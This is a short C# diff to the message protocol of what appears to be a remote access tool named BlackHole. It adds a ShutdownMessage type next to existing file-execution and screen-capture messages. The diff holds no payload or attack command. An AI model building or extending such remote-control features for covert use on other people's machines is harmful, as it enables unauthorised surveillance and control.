@@ -12,6 +12,12 @@ namespace BlackHole.Common.Network.Protocol
     // ===========================================
     // ================= Messages ================
     // ===========================================
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class ShutdownMessage : NetMessage
+    {
+        public int Reason { get; set; }
+    }
     
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public sealed class ExecuteFileMessage : NetMessage
@@ -162,6 +168,7 @@ namespace BlackHole.Common.Network.Protocol
         public string Size { get; set; }
     }
 
+    [ProtoInclude(1017, typeof(ShutdownMessage))]
     [ProtoInclude(1016, typeof(ExecuteFileMessage))]
     [ProtoInclude(1015, typeof(StopScreenCaptureMessage))]
     [ProtoInclude(1014, typeof(ScreenCaptureMessage))]
